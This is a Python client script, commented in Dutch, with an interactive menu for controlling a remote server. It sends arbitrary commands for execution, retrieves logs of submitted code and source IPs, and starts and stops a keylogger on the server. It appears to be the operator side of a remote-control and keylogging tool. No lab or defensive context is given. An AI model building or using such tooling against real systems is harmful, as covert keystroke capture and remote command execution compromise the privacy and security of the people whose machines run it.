import requests
import json

# URL van je server
base_url = "http://localhost:8000"  # of "http://<server-ip>:8000" als remote

# Headers
headers = {
    "Content-Type": "application/json"
    # Voeg hier eventueel een Authorization-header toe als je whitelist dat vereist:
    # "Authorization": "Bearer <token>"
}

# --- Bestaande Functies ---

def execute_command(prompt):
    """Execute a command on the server"""
    url = f"{base_url}/execute"
    payload = {"prompt": prompt}
    
    try:
        response = requests.post(url, headers=headers, json=payload)
        print("Status code:", response.status_code)
        try:
            print("Response JSON:", response.json())
        except json.JSONDecodeError:
            print("Response text:", response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def get_logs():
    """Fetch logs from the server"""
    url = f"{base_url}/logs"
    
    try:
        response = requests.get(url, headers=headers)
        print("Status code:", response.status_code)
        try:
            logs = response.json()
            if logs:
                print("\n--- Logs ---")
                for i, log in enumerate(logs, 1):
                    print(f"\nLog #{i}:")
                    print(f"  Source IP: {log.get('source_ip')}")
                    print(f"  Request Path: {log.get('request_path')}")
                    print(f"  Code Submitted: {log.get('code_submitted')}")
                    print(f"  Execution Result: {log.get('execution_result')}")
                    print(f"  Timestamp: {log.get('timestamp')}")
            else:
                print("No logs available")
        except json.JSONDecodeError:
            print("Response text:", response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

# --- Nieuwe Functies ---

def start_keylogger(args=None):
    """Start de keylogger op de server. Optionele argumenten kunnen worden meegegeven."""
    url = f"{base_url}/start-keylogger"
    payload = {"args": args} if args else None
    
    print("Starting keylogger...")
    if payload:
        print(f"With arguments: {payload}")
        
    try:
        response = requests.post(url, headers=headers, json=payload)
        print("Status code:", response.status_code)
        try:
            print("Response JSON:", response.json())
        except json.JSONDecodeError:
            print("Response text:", response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def stop_keylogger():
    """Stop de keylogger op de server."""
    url = f"{base_url}/stop-keylogger"
    
    print("Stopping keylogger...")
    try:
        response = requests.post(url, headers=headers)
        print("Status code:", response.status_code)
        try:
            print("Response JSON:", response.json())
        except json.JSONDecodeError:
            print("Response text:", response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def get_status():
    """Bekijk de status van actieve processen op de server."""
    url = f"{base_url}/status"
    
    print("Fetching status...")
    try:
        response = requests.get(url, headers=headers)
        print("Status code:", response.status_code)
        try:
            print("Response JSON:", response.json())
        except json.JSONDecodeError:
            print("Response text:", response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def main():
    while True:
        print("\n--- Menu ---")
        print("1. Execute command")
        print("2. Get logs")
        print("3. Start keylogger")
        print("4. Stop keylogger")
        print("5. Get process status")
        print("6. Exit")
        
        choice = input("Choose an option (1-6): ").strip()
        
        if choice == "1":
            prompt = input("Enter your command: ").strip()
            if prompt:
                execute_command(prompt)
            else:
                print("Command cannot be empty!")
        elif choice == "2":
            get_logs()
        elif choice == "3":
            args_str = input("Enter optional arguments (e.g., --host 8001), or press Enter for none: ").strip()
            args_list = args_str.split() if args_str else None
            start_keylogger(args_list)
        elif choice == "4":
            stop_keylogger()
        elif choice == "5":
            get_status()
        elif choice == "6":
            print("Exiting...")
            break
        else:
            print("Invalid choice! Please select 1, 2, 3, 4, 5, or 6.")

if __name__ == "__main__":
    main()